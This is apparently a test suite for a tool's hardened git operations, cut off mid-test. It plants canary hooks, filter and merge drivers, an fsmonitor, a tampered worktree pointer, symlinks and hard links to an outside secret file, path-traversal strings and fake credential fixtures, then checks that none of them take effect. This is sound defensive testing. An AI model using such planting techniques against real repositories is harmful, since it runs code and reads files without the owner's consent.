'use strict';
// B2b Task 7: the runner's git WRITES (src/runner/gitWrite.ts), bounded git READS (src/runner/gitRead.ts) and the worktree
// guard (src/runner/worktreeGuard.ts), with real git in temporary repositories under the OS temp folder only (never this
// project's own .git; GIT_DIR is never set). Plain node. The "programs" a repository could name are marker scripts that
// write a file when they run; each is first shown live by a control (plain git runs it), then shown never to run.
// RW3 (runner part), RW5-RW8, RW9 (runner part), RW10-RW12, RW14 (runner part), plus collect, merge check, accept,
// rollback, fast-forward, the git reads and the RunnerCore dispatch.
const test = require('node:test');
const { after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const cp = require('node:child_process');
const { MessageChannel } = require('node:worker_threads');
const loadTs = require('./load-ts.cjs');

const GW = loadTs('src/runner/gitWrite.ts');
const { HardenedGit, ensureWorktree, collect, mergeCheck, accept, rollback, fastForward, isLocked, GitFailure, GIT_WRITE_CONFIG, GIT_EOL_CONFIG, mergeDriverNames, scopePathspecs } = GW;
const { gitRead } = loadTs('src/runner/gitRead.ts');
const { walk, isGitName } = loadTs('src/runner/worktreeGuard.ts');
const { RunnerCore } = loadTs('src/runner/core.ts');
const { buildPlan } = loadTs('src/main/nexus/exec/planBuilder.ts');
const { getRecipe } = loadTs('src/shared/nexus/recipes.ts');
const { newId } = loadTs('src/main/nexus/db/ids.ts');
const { homeLabel } = loadTs('src/shared/nexus/homeLabel.ts');
const { parseRunnerMessage } = loadTs('src/shared/nexus/runnerProtocol.ts');
const { FakeSandboxDriver } = require('./helpers/fakeSandboxDriver.cjs');

const MADE = [];
after(() => { for (const d of MADE) { try { fs.rmSync(d, { recursive: true, force: true, maxRetries: 3 }); } catch { /* best effort */ } } });
function tmp(prefix) { const d = fs.mkdtempSync(path.join(os.tmpdir(), prefix)); MADE.push(d); return d; }

const git = (cwd, args, o = {}) => {
  const r = cp.spawnSync('git', ['-c', 'core.autocrlf=false', '-c', 'user.name=t', '-c', 'user.email=t@example.invalid', '-c', 'commit.gpgsign=false',
    '-c', 'core.longpaths=true', ...args], { cwd, encoding: 'utf8', windowsHide: true, input: o.input });
  if (o.check !== false) assert.equal(r.status, 0, `git ${args.join(' ')}: ${r.stderr}`);
  return r;
};
const out = (cwd, args) => git(cwd, args).stdout.trim();

/** A marker "program" (a #! script git runs, also on Windows) that records that it ran. */
function marker(dir, name) {
  const log = path.join(dir, `${name}.ran`);
  const file = path.join(dir, `${name}.sh`);
  fs.writeFileSync(file, `#!/bin/sh\necho ran >> '${log.replace(/\\/g, '/')}'\ncat >/dev/null 2>&1\nexit 0\n`, { mode: 0o755 });
  return { file: file.replace(/\\/g, '/'), ran: () => fs.existsSync(log), reset: () => fs.rmSync(log, { force: true }) };
}

/** A repository with one commit on `main`, a data home with `wt/`, and a session. */
function world(files = { 'a.txt': 'a\n' }) {
  const dir = tmp('nx-gw-');
  const repo = path.join(dir, 'repo'); const home = path.join(dir, 'nexus');
  fs.mkdirSync(repo); fs.mkdirSync(path.join(home, 'wt'), { recursive: true });
  git(repo, ['init', '-q', '-b', 'main']);
  // Deterministic regardless of the host machine's own global gitconfig (this dev machine's is core.autocrlf=true):
  // a test that wants a different repo-level setting (the EOL-scoping test below) sets it explicitly for itself.
  git(repo, ['config', 'core.autocrlf', 'false']);
  for (const [f, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(repo, f)), { recursive: true }); fs.writeFileSync(path.join(repo, f), c); }
  if (Object.keys(files).length) { git(repo, ['add', '-A']); git(repo, ['commit', '-q', '-m', 'init']); }
  const sid = newId(Date.now());
  const name = sid.toLowerCase();
  const g = new HardenedGit({ cwd: home });
  const wt = path.join(home, 'wt', name);
  const task = { repoPath: repo, worktreePath: wt, ref: `refs/nexus/job/${name}`, integrationRef: 'refs/nexus/accepted/main', branch: 'main' };
  const collectTask = (o = {}) => ({ repoPath: repo, worktreePath: wt, gitDir: path.join(repo, '.git', 'worktrees', name), ref: task.ref,
    integrationRef: task.integrationRef, scope: [], message: 'Agent change\n\nNexus-Job: J1\n', maxFileBytes: 50 * 2 ** 20, maxTotalBytes: 8 * 2 ** 30, ...o });
  return { dir, repo, home, sid, name, g, wt, task, collectTask, dataRoot: home };
}

/** The user's side of the repository: HEAD, branch, index bytes, branch list, status, every non-Nexus ref, worktree files. */
function userState(repo) {
  const idx = path.join(repo, '.git', 'index');
  return {
    head: out(repo, ['rev-parse', 'HEAD']), branch: out(repo, ['symbolic-ref', 'HEAD']),
    index: fs.existsSync(idx) ? crypto.createHash('sha256').update(fs.readFileSync(idx)).digest('hex') : null,
    branches: out(repo, ['branch', '--list']), status: out(repo, ['status', '--porcelain']),
    refs: out(repo, ['for-each-ref', '--format=%(refname) %(objectname)', 'refs/heads', 'refs/tags', 'refs/remotes']),
    files: fs.readdirSync(repo).sort()
  };
}
const refOf = (repo, ref) => { const r = git(repo, ['rev-parse', '--verify', '-q', ref], { check: false }); return r.status === 0 ? r.stdout.trim() : null; };
const failsWith = async (p, code) => {
  await assert.rejects(p, (e) => { assert.ok(e instanceof GitFailure, `a GitFailure, got ${e && e.message}`); assert.equal(e.code, code); return true; });
};

// ---------- the hardened launcher ----------

test('GW0 every write runs with the B2a hardening plus the write config; merge drivers are named for neutralising', () => {
  assert.deepEqual([...GIT_WRITE_CONFIG], ['-c', 'commit.gpgsign=false', '-c', 'tag.gpgsign=false', '-c', 'core.symlinks=false', '-c', 'core.longpaths=true',
    '-c', 'gc.auto=0', '-c', 'maintenance.auto=false', '-c', 'submodule.recurse=false', '-c', 'protocol.file.allow=never']);
  assert.deepEqual([...GIT_EOL_CONFIG], ['-c', 'core.autocrlf=false', '-c', 'core.eol=lf'], 'only on a call marked eol: true');
  assert.deepEqual(mergeDriverNames('merge.canary.driver\nmerge.conflictstyle\nmerge.a.b.name\n'), ['canary', 'a.b']);
  assert.equal(mergeDriverNames('merge.x=y.driver\n'), null);
  assert.equal(mergeDriverNames('core.x\n'), null);
  assert.deepEqual(scopePathspecs([]), [':(glob)**']);
  assert.deepEqual(scopePathspecs(['src/**', '!src/gen/**']), [':(glob)src/**', ':(glob,exclude)src/gen/**']);
  assert.deepEqual(scopePathspecs(['!x']), [':(glob)**', ':(glob,exclude)x']);
  for (const bad of ['../x', '/etc', 'C:/x', ':(top)x', 'a\nb', 'D:\\x', 'c:/y', 'C:x', '!C:/x', '!z:\\w', '\\\\server\\share\\x', '!/etc']) {
    assert.throws(() => scopePathspecs([bad]), /relative pattern/, bad);
  }
  assert.deepEqual(scopePathspecs(['docs/a:b.md']), [':(glob)docs/a:b.md'], 'a colon past the first segment is a name, not a drive');
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'runner', 'gitWrite.ts'), 'utf8');
  assert.match(src, /runGit\(bin, \[\.\.\.gitPrefix\(repoPath, this\.hooksDir\), \.\.\.GIT_WRITE_CONFIG, \.\.\.\(o\.eol \? GIT_EOL_CONFIG : \[\]\), \.\.\.o\.neutral\.args, \.\.\.wt, \.\.\.argv\]/);
  assert.match(src, /neutralizeFilterArgs\(filters\)/);
  assert.match(src, /inertSignatureArgs\(bin\)/);
});

// ---------- repo.worktree ----------

test('RW3 + RW12 the worktree job creates the integration ref at the branch head, the session ref, and a locked detached worktree; the user\'s HEAD, branch, index, files and branch list are unchanged', async () => {
  const w = world({ 'a.txt': 'a\n', 'src/b.txt': 'b\n' });
  const before = userState(w.repo);
  const f = await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  assert.equal(f.ok, true);
  assert.equal(f.integrationHead, before.head); assert.equal(f.base, before.head); assert.equal(f.integrationCreated, true);
  assert.equal(f.ref, `refs/nexus/job/${w.name}`); assert.equal(f.worktree, `wt/${w.name}`); assert.equal(f.reused, false);
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), before.head);
  assert.equal(refOf(w.repo, `refs/nexus/job/${w.name}`), before.head);
  assert.deepEqual(userState(w.repo), before, 'no user-visible change (no new branch either)');
  assert.equal(out(w.repo, ['branch', '--list']), before.branches);
  // The worktree: detached at the session ref, the files checked out, the pointer naming .git/worktrees/<session>.
  assert.equal(fs.readFileSync(path.join(w.wt, 'src', 'b.txt'), 'utf8'), 'b\n');
  const pointer = fs.readFileSync(path.join(w.wt, '.git'), 'utf8');
  assert.match(pointer.replace(/\\/g, '/').toLowerCase(), new RegExp(`/\\.git/worktrees/${w.name}\\s*$`));
  const porcelain = out(w.repo, ['worktree', 'list', '--porcelain']);
  const block = porcelain.split(/\n\n/).find((b) => b.toLowerCase().includes(w.name));
  assert.ok(block, 'the worktree is registered');
  assert.match(block, /\ndetached/); assert.match(block, /\nlocked Nexus session/);
  assert.equal(await isLocked(w.g, w.repo, await w.g.neutral(w.repo), w.wt), true);
  // Only refs under refs/nexus/* were written.
  const all = out(w.repo, ['for-each-ref', '--format=%(refname)']).split('\n');
  assert.deepEqual(all.filter((r) => !r.startsWith('refs/heads/')).sort(), ['refs/nexus/accepted/main', `refs/nexus/job/${w.name}`].sort());
});

test('RW14 (runner) the worktree job is idempotent: a second run, a run after only the refs were made, and a run after the folder vanished all end in the same locked worktree', async () => {
  const w = world();
  const first = await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const again = await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  assert.equal(again.base, first.base); assert.equal(again.reused, true); assert.equal(again.integrationCreated, false);
  // The folder was removed (an interrupted attempt or a cleanup): the registered entry is ours by name and replaced.
  fs.rmSync(w.wt, { recursive: true, force: true });
  const third = await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  assert.equal(third.reused, false); assert.equal(third.base, first.base);
  assert.ok(fs.existsSync(path.join(w.wt, 'a.txt')));
  assert.equal(await isLocked(w.g, w.repo, await w.g.neutral(w.repo), w.wt), true);
  // Refs only (the attempt stopped after update-ref): the next run keeps them and adds the worktree.
  const w2 = world();
  const head = out(w2.repo, ['rev-parse', 'HEAD']);
  git(w2.repo, ['update-ref', 'refs/nexus/accepted/main', head]); git(w2.repo, ['update-ref', w2.task.ref, head]);
  const f = await ensureWorktree(w2.g, w2.task, { dataRoot: w2.dataRoot });
  assert.equal(f.integrationCreated, false); assert.equal(f.base, head);
  // An integration ref that already moved ahead is kept: the session starts from the accepted work, never the branch.
  const w3 = world();
  const h3 = out(w3.repo, ['rev-parse', 'HEAD']);
  const tree = out(w3.repo, ['rev-parse', 'HEAD^{tree}']);
  const ahead = git(w3.repo, ['commit-tree', tree, '-p', h3, '-m', 'accepted']).stdout.trim();
  git(w3.repo, ['update-ref', 'refs/nexus/accepted/main', ahead]);
  assert.equal((await ensureWorktree(w3.g, w3.task, { dataRoot: w3.dataRoot })).base, ahead);
});

test('RW9 (runner) an empty repository answers repo_empty and nothing is written; a missing branch answers branch_missing', async () => {
  const w = world({});
  await failsWith(ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot }), 'repo_empty');
  assert.equal(out(w.repo, ['for-each-ref']), '');
  assert.equal(fs.existsSync(w.wt), false);
  const w2 = world();
  await failsWith(ensureWorktree(w2.g, { ...w2.task, branch: 'gone', integrationRef: 'refs/nexus/accepted/gone' }, { dataRoot: w2.dataRoot }), 'branch_missing');
  assert.equal(refOf(w2.repo, 'refs/nexus/accepted/gone'), null);
});

test('the worktree task refuses refs outside refs/nexus, a worktree outside <dataHome>/wt and a repository whose .git is a file', async () => {
  const w = world();
  await failsWith(ensureWorktree(w.g, { ...w.task, ref: 'refs/heads/x' }, { dataRoot: w.dataRoot }), 'bad_task');
  await failsWith(ensureWorktree(w.g, { ...w.task, integrationRef: 'refs/heads/main' }, { dataRoot: w.dataRoot }), 'bad_task');
  await failsWith(ensureWorktree(w.g, { ...w.task, worktreePath: path.join(w.dir, 'elsewhere', w.name) }, { dataRoot: w.dataRoot }), 'bad_task');
  await failsWith(ensureWorktree(w.g, { ...w.task, worktreePath: path.join(w.home, 'wt', 'UPPER0000000000000000000000') }, { dataRoot: w.dataRoot }), 'bad_task');
  await failsWith(ensureWorktree(w.g, { ...w.task, branch: '-x', integrationRef: 'refs/nexus/accepted/-x' }, { dataRoot: w.dataRoot }), 'bad_task');
  // A linked worktree of the user's (its .git is a file) is not a supported project folder.
  const linked = path.join(w.dir, 'linked');
  git(w.repo, ['worktree', 'add', '-q', '--detach', linked]);
  await failsWith(ensureWorktree(w.g, { ...w.task, repoPath: linked }, { dataRoot: w.dataRoot }), 'repo_layout_unsupported');
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), null, 'nothing written');
});

test('RW5 a planted hook, filter driver and merge driver never run (controls: plain git runs each)', async () => {
  const w = world({ 'a.txt': 'a\n', 'm.txt': 'base\n' });
  const hook = marker(w.dir, 'hook'); const filter = marker(w.dir, 'filter'); const merge = marker(w.dir, 'merge');
  const hooks = path.join(w.repo, '.git', 'hooks');
  for (const h of ['reference-transaction', 'post-checkout', 'pre-commit', 'post-commit', 'post-merge', 'pre-merge-commit']) {
    fs.writeFileSync(path.join(hooks, h), `#!/bin/sh\n'${hook.file}' "$@"\n`, { mode: 0o755 });
  }
  fs.writeFileSync(path.join(w.repo, '.gitattributes'), 'a.txt filter=canary\nm.txt merge=canary\n');
  git(w.repo, ['add', '.gitattributes']); git(w.repo, ['commit', '-q', '-m', 'attrs']);
  git(w.repo, ['config', 'filter.canary.smudge', filter.file]); git(w.repo, ['config', 'filter.canary.clean', filter.file]);
  git(w.repo, ['config', 'filter.canary.required', 'true']);
  git(w.repo, ['config', 'merge.canary.driver', `${merge.file} %O %A %B`]);
  // Controls.
  git(w.repo, ['update-ref', 'refs/control', 'HEAD']); assert.equal(hook.ran(), true, 'control: plain git runs the reference-transaction hook');
  git(w.repo, ['update-ref', '-d', 'refs/control']); hook.reset();
  // Deterministic control (as B2a's 026afd8a): git status runs the clean filter only for an entry it must compare by
  // content. A size change is "modified" from the stat alone, so the edit keeps the committed size and gets an mtime far
  // from the index entry's: the stat is dirty but not decisive, and git must clean the file to compare it.
  const edited = 'A\n';
  assert.equal(edited.length, 'a\n'.length);
  fs.writeFileSync(path.join(w.repo, 'a.txt'), edited);
  const past = new Date('2001-01-01T00:00:00Z');
  fs.utimesSync(path.join(w.repo, 'a.txt'), past, past);
  git(w.repo, ['status'], { check: false });
  assert.equal(filter.ran(), true, 'control: plain git status runs the clean filter'); filter.reset();
  git(w.repo, ['checkout', '-q', '--', 'a.txt'], { check: false }); filter.reset(); hook.reset();
  const base = out(w.repo, ['rev-parse', 'HEAD']);
  const t1 = out(w.repo, ['rev-parse', 'HEAD^{tree}']);
  const mkCommit = (content, msg) => {
    const blob = git(w.repo, ['hash-object', '-w', '--stdin'], { input: content }).stdout.trim();
    const tree = git(w.repo, ['mktree'], { input: out(w.repo, ['ls-tree', base]).split('\n').map((l) => (l.endsWith('\tm.txt') ? l.replace(/[0-9a-f]{40}/, blob) : l)).join('\n') + '\n' }).stdout.trim();
    assert.notEqual(tree, t1);
    return git(w.repo, ['commit-tree', tree, '-p', base, '-m', msg]).stdout.trim();
  };
  const ours = mkCommit('ours\n', 'ours'); const theirs = mkCommit('theirs\n', 'theirs');
  git(w.repo, ['merge-tree', '--write-tree', ours, theirs], { check: false });
  assert.equal(merge.ran(), true, 'control: plain git merge-tree runs the merge driver'); merge.reset();
  hook.reset(); filter.reset();
  // Nexus's writes: worktree (update-ref, checkout), collect (add, commit-tree, update-ref), merge check, accept.
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'changed\n');
  const c = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.equal(c.changed, true);
  assert.equal(hook.ran(), false, 'no hook ran in the worktree job or the collect');
  assert.equal(filter.ran(), false, 'no filter ran in the worktree job or the collect');
  // The test's own setup move of the integration ref is plain git: with the planted hooks live it would run the
  // reference-transaction hook itself, so it runs with a hooks folder that does not exist (it is not Nexus's write).
  git(w.repo, ['-c', `core.hooksPath=${path.join(w.dir, 'no-hooks').replace(/\\/g, '/')}`, 'update-ref', 'refs/nexus/accepted/main', ours]);
  assert.equal(hook.ran(), false, 'the setup update-ref ran no hook');
  const mc = await mergeCheck(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', head: theirs });
  assert.equal(mc.clean, false, 'a neutralised merge driver answers a conflict, never a program');
  await failsWith(accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: ours, head: theirs, message: 'Accept\n' },
    { onPrepared: () => assert.fail('never prepared on a conflict') }), 'merge_conflict');
  await gitRead(w.g, { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' });
  assert.equal(hook.ran(), false, 'no hook ran'); assert.equal(filter.ran(), false, 'no filter ran'); assert.equal(merge.ran(), false, 'no merge driver ran');
});

test('RW6 LFS pointers stay pointers in the worktree (the lfs filter is switched off; required=true does not stop the checkout)', async () => {
  const pointer = 'version https://git-lfs.github.com/spec/v1\noid sha256:' + 'a'.repeat(64) + '\nsize 12345\n';
  const w = world({ 'a.txt': 'a\n', 'big.bin': pointer, '.gitattributes': '*.bin filter=lfs diff=lfs merge=lfs -text\n' });
  const lfs = marker(w.dir, 'lfs');
  for (const k of ['smudge', 'clean', 'process']) git(w.repo, ['config', `filter.lfs.${k}`, lfs.file]);
  git(w.repo, ['config', 'filter.lfs.required', 'true']);
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  assert.equal(fs.readFileSync(path.join(w.wt, 'big.bin'), 'utf8'), pointer);
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'b\n');
  await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.equal(git(w.repo, ['cat-file', 'blob', `${w.task.ref}:big.bin`]).stdout, pointer, 'committed as the pointer');
  assert.equal(lfs.ran(), false);
});

// ---------- changeset.collect ----------

test('collect commits the paths in scope as the agent (identity and Nexus-Job trailer) on the session ref and moves the worktree HEAD; the user\'s side is unchanged', async () => {
  const w = world({ 'a.txt': 'a\n', 'docs/d.md': 'd\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const before = userState(w.repo);
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'a2\n'); fs.writeFileSync(path.join(w.wt, 'b.txt'), 'new\n');
  fs.writeFileSync(path.join(w.wt, 'docs', 'd.md'), 'd2\n');
  const f = await collect(w.g, w.collectTask({ scope: ['*.txt'] }), { dataRoot: w.dataRoot });
  assert.equal(f.changed, true); assert.equal(f.parent, before.head); assert.equal(f.base, before.head);
  assert.deepEqual([...f.paths].sort(), ['a.txt', 'b.txt']);
  assert.deepEqual(f.diffstat, { files: 2, insertions: 2, deletions: 1 });
  assert.equal(refOf(w.repo, w.task.ref), f.head);
  assert.equal(out(w.wt, ['rev-parse', 'HEAD']), f.head, 'the worktree HEAD moved with the ref');
  assert.equal(out(w.repo, ['log', '-1', '--format=%an <%ae>|%cn <%ce>', f.head]), 'Nexus agent <agent@nexus.invalid>|Nexus agent <agent@nexus.invalid>');
  assert.match(out(w.repo, ['log', '-1', '--format=%B', f.head]), /\n\nNexus-Job: J1$/);
  assert.equal(git(w.repo, ['cat-file', '-e', `${f.head}:docs/d.md`]).status, 0);
  assert.equal(git(w.repo, ['show', `${f.head}:docs/d.md`]).stdout, 'd\n', 'out of scope: not committed');
  assert.deepEqual(userState(w.repo), before);
  // Nothing new in scope: no commit, the ref stays.
  const g2 = await collect(w.g, w.collectTask({ scope: ['src/**'] }), { dataRoot: w.dataRoot });
  assert.equal(g2.changed, false); assert.equal(g2.head, f.head); assert.equal(refOf(w.repo, w.task.ref), f.head);
});

test('RW7 a rewritten worktree .git pointer answers worktree_tampered and nothing is committed', async () => {
  const w = world();
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const ref = refOf(w.repo, w.task.ref);
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'x\n');
  const other = path.join(w.dir, 'evil-gitdir'); fs.mkdirSync(other);
  // Git for Windows marks a worktree's `.git` file hidden (core.hideDotFiles=dotGitOnly), and a Windows open that
  // replaces a hidden file (CREATE_ALWAYS, Node's 'w') is refused with EPERM. A tamperer rewrites the bytes in place
  // (or through the container's bind mount, which has no hidden bit), so the test does the same: open, truncate, write.
  const pointer = path.join(w.wt, '.git');
  const rewrite = (content) => {
    const fd = fs.openSync(pointer, 'r+');
    try { fs.ftruncateSync(fd, 0); fs.writeSync(fd, content, 0, 'utf8'); } finally { fs.closeSync(fd); }
    assert.equal(fs.readFileSync(pointer, 'utf8'), content, 'the pointer was rewritten');
  };
  for (const content of [`gitdir: ${other.replace(/\\/g, '/')}\n`, 'gitdir: ../../repo/.git\n', 'garbage\n']) {
    rewrite(content);
    await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'worktree_tampered');
    assert.equal(refOf(w.repo, w.task.ref), ref);
  }
  fs.rmSync(path.join(w.wt, '.git'));
  fs.mkdirSync(path.join(w.wt, '.git'));
  await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'worktree_tampered');
  assert.equal(refOf(w.repo, w.task.ref), ref);
  // A collect naming another git folder than the worktree's is refused before anything runs.
  await failsWith(collect(w.g, w.collectTask({ gitDir: other }), { dataRoot: w.dataRoot }), 'bad_task');
});

test('RW8 a path longer than 260 characters checks out and commits', async () => {
  const deep = Array.from({ length: 6 }, (_, i) => `segment-${i}-${'x'.repeat(30)}`).join('/') + '/file-with-a-long-name.txt';
  const w = world({ 'a.txt': 'a\n', [deep]: 'deep\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const abs = path.join(w.wt, ...deep.split('/'));
  assert.ok(abs.length > 260, `the path is ${abs.length} characters`);
  assert.equal(fs.readFileSync(abs, 'utf8'), 'deep\n');
  fs.writeFileSync(abs, 'deeper\n');
  const f = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.deepEqual(f.paths, [deep]);
});

test('RW10 a nested repository planted in the worktree (its config naming an fsmonitor canary) is refused nested_repo and the canary never runs', async () => {
  const w = world();
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const fsmon = marker(w.dir, 'fsmonitor');
  const sub = path.join(w.wt, 'vendor', 'sub');
  fs.mkdirSync(sub, { recursive: true });
  git(sub, ['init', '-q']);
  git(sub, ['config', 'core.fsmonitor', fsmon.file]);
  fs.writeFileSync(path.join(sub, 'f.txt'), 'f\n');
  git(sub, ['status'], { check: false });
  assert.equal(fsmon.ran(), true, 'control: plain git in the nested repository runs its fsmonitor'); fsmon.reset();
  const ref = refOf(w.repo, w.task.ref);
  await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'nested_repo');
  assert.equal(fsmon.ran(), false); assert.equal(refOf(w.repo, w.task.ref), ref);
  // Other spellings of .git are nested repositories too.
  fs.rmSync(path.join(w.wt, 'vendor'), { recursive: true, force: true });
  for (const n of ['.GIT', 'GIT~1', '.git.']) assert.equal(isGitName(n), true, n);
  fs.mkdirSync(path.join(w.wt, 'pkg')); fs.writeFileSync(path.join(w.wt, 'pkg', '.git'), 'gitdir: /x\n');
  await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'nested_repo');
  assert.equal(refOf(w.repo, w.task.ref), ref);
});

test('RW11 a junction and a relative symlink planted in the worktree are refused symlink_in_worktree and their targets are never read', async () => {
  const w = world();
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  const outside = path.join(w.dir, 'outside'); fs.mkdirSync(outside);
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'outside the worktree\n');
  const calls = [];
  const spy = { lstat: (p) => { calls.push(['lstat', p]); return fsp.lstat(p); }, readdir: (p) => { calls.push(['readdir', p]); return fsp.readdir(p); } };
  fs.symlinkSync(outside, path.join(w.wt, 'junction'), 'junction');
  const r = await walk(w.wt, { fs: spy });
  assert.deepEqual(r, { ok: false, code: 'symlink_in_worktree', entry: 'junction' });
  const norm = (p) => path.resolve(p).toLowerCase();
  assert.ok(!calls.some(([, p]) => norm(p).startsWith(norm(outside))), 'nothing outside the worktree was touched');
  assert.ok(!calls.some(([op, p]) => op === 'readdir' && norm(p) === norm(path.join(w.wt, 'junction'))), 'the junction was never listed');
  const ref = refOf(w.repo, w.task.ref);
  await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'symlink_in_worktree');
  assert.equal(refOf(w.repo, w.task.ref), ref);
  fs.rmSync(path.join(w.wt, 'junction'));
  // A relative NT symlink (as a container would plant one through the bind mount). Creating one needs the symlink
  // privilege (Developer Mode) on Windows; without it the junction above is the planted link of this test.
  let made = false;
  try { fs.symlinkSync('../../../outside/secret.txt', path.join(w.wt, 'link.txt'), 'file'); made = true; } catch (e) { assert.match(String(e.code), /EPERM|EACCES/); }
  if (made) {
    calls.length = 0;
    assert.deepEqual(await walk(w.wt, { fs: spy }), { ok: false, code: 'symlink_in_worktree', entry: 'link.txt' });
    assert.ok(!calls.some(([, p]) => norm(p).startsWith(norm(outside))));
    await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'symlink_in_worktree');
  }
  // A hard link is a second name for bytes that may live elsewhere: refused too.
  fs.rmSync(path.join(w.wt, 'link.txt'), { force: true });
  fs.linkSync(path.join(outside, 'secret.txt'), path.join(w.wt, 'hard.txt'));
  assert.deepEqual(await walk(w.wt), { ok: false, code: 'symlink_in_worktree', entry: 'hard.txt' });
});

test('the guard caps file and worktree sizes and refuses a root that is not a folder', async () => {
  const fake = (entries) => ({
    lstat: async (p) => {
      const rel = path.relative('/root', p).split(path.sep).join('/');
      if (rel === '') return { isFile: () => false, isDirectory: () => true, isSymbolicLink: () => false, size: 0, nlink: 1 };
      const e = entries[rel];
      return { isFile: () => e.kind === 'file', isDirectory: () => e.kind === 'dir', isSymbolicLink: () => e.kind === 'link', size: e.size ?? 0, nlink: 1 };
    },
    readdir: async (p) => {
      const rel = path.relative('/root', p).split(path.sep).join('/');
      return Object.keys(entries).filter((k) => (rel === '' ? !k.includes('/') : k.startsWith(`${rel}/`) && !k.slice(rel.length + 1).includes('/'))).map((k) => k.split('/').pop());
    }
  });
  const root = path.resolve('/root');
  assert.deepEqual(await walk(root, { fs: fake({ '.git': { kind: 'file', size: 50 }, 'a': { kind: 'file', size: 60 * 2 ** 20 } }) }),
    { ok: false, code: 'file_too_large', entry: 'a' });
  assert.deepEqual(await walk(root, { maxTotalBytes: 100, fs: fake({ 'a': { kind: 'file', size: 60 }, 'b': { kind: 'file', size: 60 } }) }),
    { ok: false, code: 'worktree_too_large', entry: 'b' });
  assert.deepEqual(await walk(root, { fs: fake({ 'd': { kind: 'dir' }, 'd/x': { kind: 'file', size: 1 } }) }), { ok: true, files: 1, bytes: 1 });
  assert.deepEqual(await walk(root, { fs: fake({ '.git': { kind: 'dir' } }) }), { ok: false, code: 'nested_repo', entry: '.git' });
  const f = tmp('nx-guard-'); fs.writeFileSync(path.join(f, 'file'), 'x');
  assert.equal((await walk(path.join(f, 'file'))).ok, false);
  assert.equal((await walk('relative/path')).ok, false);
});

test('collect refuses a link or a gitlink in the index (link_or_gitlink) and commits nothing', async () => {
  const w = world();
  const blob = git(w.repo, ['hash-object', '-w', '--stdin'], { input: 'a.txt' }).stdout.trim();
  git(w.repo, ['update-index', '--add', '--cacheinfo', `120000,${blob},link`]);
  git(w.repo, ['commit', '-q', '-m', 'a link']);
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  assert.equal(fs.lstatSync(path.join(w.wt, 'link')).isSymbolicLink(), false, 'core.symlinks=false: a plain file, never a link');
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'changed\n');
  const ref = refOf(w.repo, w.task.ref);
  await failsWith(collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }), 'link_or_gitlink');
  assert.equal(refOf(w.repo, w.task.ref), ref);
});

// ---------- merge check, accept, rollback, fast-forward, reads ----------

// ---------- B2b Task 8 fix round 1: the collect's secret scan and the agent tool's settings folder ----------

test('collect scans every added line of a real diff: ++-prefixed text, odd and spaced paths, exact lines; only path:line:rule leaves, never text', async () => {
  const w = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'plus.txt'), '++AKIAABCDEFGHIJKLMNOP\nplain\n++-----BEGIN PRIVATE KEY-----\n+++ b/fake.txt\n');
  fs.mkdirSync(path.join(w.wt, 'dir'), { recursive: true });
  fs.writeFileSync(path.join(w.wt, 'dir', 'sp ace.txt'), 'x\nAKIAABCDEFGHIJKLMNOP\n');
  fs.writeFileSync(path.join(w.wt, 'é.txt'), 'AKIAABCDEFGHIJKLMNOP\n');
  const f = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  const key = (h) => `${h.path}:${h.line}:${h.rule}`;
  assert.deepEqual(f.secretHits.map(key).sort(), ['dir/sp ace.txt:2:provider_key', 'plus.txt:1:provider_key', 'plus.txt:3:private_key', 'é.txt:1:provider_key']);
  assert.equal(f.scanTruncated, false);
  assert.ok(!JSON.stringify(f).includes('AKIA') && !JSON.stringify(f).includes('BEGIN'), 'no matched text in the facts');
});

test('collect: a patch cut at its cap reports scanTruncated (the scan never silently passes what it did not read)', async () => {
  const w = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'aaa-padding.txt'), 'line of ordinary padding text\n'.repeat(400));
  fs.writeFileSync(path.join(w.wt, 'zzz-secret.txt'), 'AKIAABCDEFGHIJKLMNOP\n');
